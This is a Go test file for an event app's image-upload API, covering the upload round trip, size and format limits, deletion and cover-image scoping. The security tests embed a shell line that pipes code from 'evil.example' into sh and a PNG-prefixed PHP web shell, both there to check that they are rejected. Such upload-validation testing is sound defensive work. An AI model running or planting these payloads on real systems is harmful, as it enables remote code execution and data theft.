package httpapi

import (
	"bytes"
	"image"
	"image/color"
	"image/png"
	"net/http"
	"os"
	"testing"

	"github.com/vul-os/cackle/internal/media"
)

func makeTestPNGBytes(t *testing.T, w, h int) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.Set(x, y, color.RGBA{R: uint8(x * 20), G: uint8(y * 20), B: 100, A: 255})
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatalf("encode test png: %v", err)
	}
	return buf.Bytes()
}

// TestImageUpload_HappyPathServesFromMedia covers the full round trip:
// upload a real PNG as an org admin, get back {id,url,width,height}, and
// confirm GET /media/{id} serves the bytes back with the right content
// type and a long-lived cache header.
func TestImageUpload_HappyPathServesFromMedia(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "img-happy")

	png := makeTestPNGBytes(t, 12, 8)
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx.eventID+"/images", fx.ownerToken, "cover.png", png)
	if rec.Code != http.StatusCreated {
		t.Fatalf("upload image: status %d body %s", rec.Code, rec.Body.String())
	}

	resp := decodeBody[struct {
		ID     string `json:"id"`
		URL    string `json:"url"`
		Width  int    `json:"width"`
		Height int    `json:"height"`
	}](t, rec)
	if resp.ID == "" {
		t.Fatal("expected non-empty id")
	}
	if resp.URL != "/media/"+resp.ID {
		t.Fatalf("url = %q, want /media/%s", resp.URL, resp.ID)
	}
	if resp.Width != 12 || resp.Height != 8 {
		t.Fatalf("dims = %dx%d, want 12x8", resp.Width, resp.Height)
	}

	rec = h.do(http.MethodGet, resp.URL, "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("GET %s: status %d", resp.URL, rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); ct != "image/png" {
		t.Fatalf("Content-Type = %q, want image/png", ct)
	}
	if cc := rec.Header().Get("Cache-Control"); cc == "" || !containsSubstr(cc, "immutable") {
		t.Fatalf("Cache-Control = %q, want an immutable directive", cc)
	}
	if rec.Body.Len() == 0 {
		t.Fatal("served media body is empty")
	}
}

func containsSubstr(s, sub string) bool {
	return bytes.Contains([]byte(s), []byte(sub))
}

// TestImageUpload_RejectsScriptBytesDisguisedAsPNG is the HTTP-layer
// version of the core security requirement: a file named "cover.png" whose
// actual bytes are a shell script must be rejected, even though the
// client-supplied filename and (browser-guessed) form Content-Type both
// claim it's an image. The upload handler never trusts either.
func TestImageUpload_RejectsScriptBytesDisguisedAsPNG(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "img-script")

	script := []byte("#!/bin/sh\ncurl evil.example/steal | sh\n")
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx.eventID+"/images", fx.ownerToken, "cover.png", script)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("upload script-as-png: expected 400, got %d body %s", rec.Code, rec.Body.String())
	}

	// Confirm nothing was persisted: no image row, no gallery entry.
	rec = h.do(http.MethodGet, "/api/events/"+fx.eventID, "", nil)
	resp := decodeBody[struct {
		Gallery []struct{ ID string } `json:"gallery"`
	}](t, rec)
	if len(resp.Gallery) != 0 {
		t.Fatalf("expected empty gallery after rejected upload, got %d images", len(resp.Gallery))
	}
}

// TestImageUpload_RejectsPolyglotPNGMagicWithGarbagePayload covers a
// sneakier variant: real PNG magic bytes followed by non-PNG content, the
// classic "trust the header" polyglot trick. Only a real decode (not just
// a magic-byte sniff) catches this — see internal/media.
func TestImageUpload_RejectsPolyglotPNGMagicWithGarbagePayload(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "img-polyglot")

	fake := append([]byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'}, []byte("<?php system($_GET['c']); ?>")...)
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx.eventID+"/images", fx.ownerToken, "innocent.png", fake)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("upload polyglot png: expected 400, got %d body %s", rec.Code, rec.Body.String())
	}
}

// TestImageUpload_RejectsOversizeFile confirms the 8MB cap is enforced at
// the HTTP layer, not just inside internal/media.
func TestImageUpload_RejectsOversizeFile(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "img-oversize")

	oversized := make([]byte, media.MaxUploadBytes+(1<<20)) // definitely over the cap, but under maxUploadRequestBytes's own hard ceiling test below
	copy(oversized, []byte{0x89, 'P', 'N', 'G', '\r', '\n', 0x1a, '\n'})
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx.eventID+"/images", fx.ownerToken, "huge.png", oversized)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("upload oversize file: expected 400, got %d body %s", rec.Code, rec.Body.String())
	}
}

// TestImageUpload_RejectsUnsupportedFormat confirms a real-but-unsupported
// image format (GIF) is rejected with a clear error rather than silently
// accepted.
func TestImageUpload_RejectsUnsupportedFormat(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "img-gif")

	gif := []byte("GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;")
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx.eventID+"/images", fx.ownerToken, "anim.gif", gif)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("upload gif: expected 400, got %d body %s", rec.Code, rec.Body.String())
	}
}

// TestImageDelete_RemovesRowAndClearsCover covers delete + the
// ON DELETE SET NULL cover_image_id behaviour end to end over HTTP.
func TestImageDelete_RemovesRowAndClearsCover(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "img-delete")

	png := makeTestPNGBytes(t, 4, 4)
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx.eventID+"/images", fx.ownerToken, "cover.png", png)
	upload := decodeBody[struct {
		ID string `json:"id"`
	}](t, rec)

	rec = h.do(http.MethodPatch, "/api/events/"+fx.eventID, fx.ownerToken, map[string]any{"cover_image_id": upload.ID})
	if rec.Code != http.StatusOK {
		t.Fatalf("set cover image: status %d body %s", rec.Code, rec.Body.String())
	}
	ev := decodeBody[struct {
		Event struct {
			CoverImageID *string `json:"cover_image_id"`
		} `json:"event"`
	}](t, rec)
	if ev.Event.CoverImageID == nil || *ev.Event.CoverImageID != upload.ID {
		t.Fatalf("expected cover_image_id = %q, got %+v", upload.ID, ev.Event.CoverImageID)
	}

	rec = h.do(http.MethodDelete, "/api/images/"+upload.ID, fx.ownerToken, nil)
	if rec.Code != http.StatusNoContent {
		t.Fatalf("delete image: status %d body %s", rec.Code, rec.Body.String())
	}

	// The event's cover reference is cleared automatically.
	rec = h.do(http.MethodGet, "/api/events/"+fx.eventID, "", nil)
	ev = decodeBody[struct {
		Event struct {
			CoverImageID *string `json:"cover_image_id"`
		} `json:"event"`
	}](t, rec)
	if ev.Event.CoverImageID != nil {
		t.Fatalf("expected cover_image_id cleared after delete, got %v", *ev.Event.CoverImageID)
	}

	// The file itself is gone from disk too.
	if _, err := os.Stat(imagePath(h.mediaDir, upload.ID, media.FormatPNG)); !os.IsNotExist(err) {
		t.Fatalf("expected image file removed from disk, stat err = %v", err)
	}

	// And serving it now 404s.
	rec = h.do(http.MethodGet, "/media/"+upload.ID, "", nil)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("GET deleted media: expected 404, got %d", rec.Code)
	}
}

// TestImageDelete_CannotSetCoverToAnotherEventsImage confirms
// PATCH cover_image_id is scoped to the event's own gallery.
func TestImageDelete_CannotSetCoverToAnotherEventsImage(t *testing.T) {
	h := newTestHarness(t)
	fx1 := h.newPublishedEvent(t, "img-cross-1")
	fx2 := h.newPublishedEvent(t, "img-cross-2")

	png := makeTestPNGBytes(t, 4, 4)
	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+fx1.eventID+"/images", fx1.ownerToken, "cover.png", png)
	upload := decodeBody[struct {
		ID string `json:"id"`
	}](t, rec)

	rec = h.do(http.MethodPatch, "/api/events/"+fx2.eventID, fx2.ownerToken, map[string]any{"cover_image_id": upload.ID})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("cross-event cover image: expected 400, got %d body %s", rec.Code, rec.Body.String())
	}
}
